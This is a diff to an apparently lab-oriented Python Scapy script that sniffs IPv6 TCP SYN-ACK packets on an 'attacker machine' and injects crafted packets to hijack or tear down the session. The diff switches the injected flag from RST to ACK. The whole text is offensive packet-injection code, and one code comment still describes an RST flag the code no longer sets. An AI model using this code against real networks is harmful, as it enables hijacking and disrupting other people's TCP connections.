@@ -6,7 +6,7 @@ from scapy.all import *
 
 
 # The script sniffs the channel on ens34 (on the attacker machine) and looks for TCP traffic (Sync-ACK) packet,
-# then crafts a new TCP A packet to hijack the TCP session and forwards the crafted packet accordingly.
+# then crafts a new TCP packet with "A" flag to hijack the TCP session and forwards the crafted packet accordingly.
 
 def packet_callback(packet):
     if TCP in packet and packet[IPv6].dst == "2001:db8:0:1::2" and packet[TCP].flags == 'SA':
@@ -22,7 +22,7 @@ def packet_callback(packet):
         src_port = packet[TCP].dport
         dst_port = packet[TCP].sport
         # Create the TCP layer with the RST flag set
-        tcp = TCP(sport=src_port, dport=dst_port, seq=1, ack=1, window=29200, flags='R')
+        tcp = TCP(sport=src_port, dport=dst_port, seq=1, ack=1, window=29200, flags='A')
 
         # Create the packet by stacking the layers
         pkt = eth / ipv6 / ipv4 / tcp
